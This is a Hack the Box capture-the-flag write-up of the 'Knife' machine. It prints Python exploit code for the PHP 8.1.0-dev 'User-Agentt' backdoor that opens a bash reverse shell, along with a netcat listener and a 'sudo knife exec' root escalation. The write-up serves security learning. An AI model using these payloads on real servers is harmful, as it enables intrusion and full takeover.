#+summary: Write-up for knife! The easy linux box from Hack the Box. It has a webserver running a php version containing a backdoor.
#+filetags: :HTB:write-up:hacking:
* DONE Introduction
Welcome back to another write-up for another Hack the Box machine.
This time we'll look at the easy linux box Knife.
This machine was running a webserver with an old PHP version on it, but we'll dive deeper into that later.

* DONE Recon
First things first, let's get to know this machine a little better shall we?
We'll start by examining what services the machine has running.
** DONE Nmap all ports
Below we see the output from the ~nmap~ scan.

#+end_example
We see the webserver mentioned earlier running on port 80, which is ~Apache httpd 2.4.41~.
There is also an open ~ssh~ daemon running on port 22.

** DONE Web enumeration
All right let us enumerate the webserver
*** DONE Gobuster
~gobuster~ didn't really give us anything of use other than ~/index.php~.

#+end_example
*** DONE ~/index.php~
If we open up the site with a browser connected to a proxy like ~zap~ or ~burp~, and navigate to ~/index.php~.
#+attr_org: :width 700
#+caption: Rendered html of ~/index.php~
[[file:assets/2021-07-26_19-51-07_screenshot.png]]

The menu in the top right corner doesn't do anything, so let's take a look at the headers to see if there is anything useful.
#+begin_example
HTTP/1.1 200 OK
Date: Mon, 26 Jul 2021 17:20:52 GMT
Server: Apache/2.4.41 (Ubuntu)
X-Powered-By: PHP/8.1.0-dev
Vary: Accept-Encoding
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
#+end_example

Here we again see the server version as ~Apache/2.4.41~, but more importantly the PHP version is leaked.
If you look at the ~X-Powered-By:~ header, we see that it's is running ~PHP/8.1.0-dev~.

* DONE Exploitation
** Finding the vulnerability
Now that we're done gathering all information possible about the target, mainly the version numbers of the softare running on the server.

Googling the PHP version, you'll quickly find that there is a backdoor in that version[fn:1].
Which could be used to gain a shell.
They even gave a script that gives a reverse shell on the target.
[[https://github.com/flast101/php-8.1.0-dev-backdoor-rce][GitHub Repo]]

We can take a closer look at the POC to getter a better understand the backdoor.
The backdoor allowed for remote code execution in the custom header "User-Agentt", notice the extra "t".
#+caption: reverse shell POC code
#+begin_src python
  def reverse_shell(args):
      payload = (
          'bash -c "bash -i >& /dev/tcp/'
          + args.lhost
          + "/"
          + args.lport
          + ' 0>&1"'
      )
      injection = request.get(
          args.url,
          headers={"User-Agentt": "zerodiumsystem('" + payload + "');"},
          allow_redirects=False,
      )
#+end_src
First the payload is crafted based on the given arguments.
It essentially builds the command:
: $ bash -c "bash -i >& /dev/tcp/<LOCAL-IP>/<LOCAL-PORT> 0>&1"

Which is then injected into the special header "User-Agentt", inside the parentheses of ~"zerodiumsystem();"~.
** Popping shell
First we setup a ~netcat~ listener on our machine:
: $ nc -nlvp 4444

Then we execute the revshell POC script with the right arguments:
#+begin_example
┌──[c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/knife/php-8.1.0-dev-backdoor-rce ]
└─> $ python revshell_php_8.1.0-dev.py "http://10.129.180.32" 10.10.14.87 4444                                   20:02
#+end_example

And just like that we got a shell and user flag:
#+begin_example
┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/knife ]
└─> $ nc -nlvp 4444                                                    19:56

#+end_example

* DONE Priv-esc
Now that we got a shell, we must escalate our privileges to get ~root~.

By using the linux enumeration tool ~linpeas~, we will find that ~james~, our user, has nopassword permissions for the binary ~/usr/bin/knife~.

Which given the machines name, could be worth looking into.
Let's open [[https://gtfobins.github.io/][GTFObins]], and search for knife.
This shows the that following command can be used to escalate our privileges:
: $ sudo knife exec -E 'exec "/bin/sh"'

So let's run it and get our ~root~ flag:
#+begin_example
james@knife:/$ sudo knife exec -E 'exec "/bin/bash"'
sudo knife exec -E 'exec "/bin/bash"'

whoami
root
pwd
/
cd root
ls
delete.sh
root.txt
snap
cat root.txt
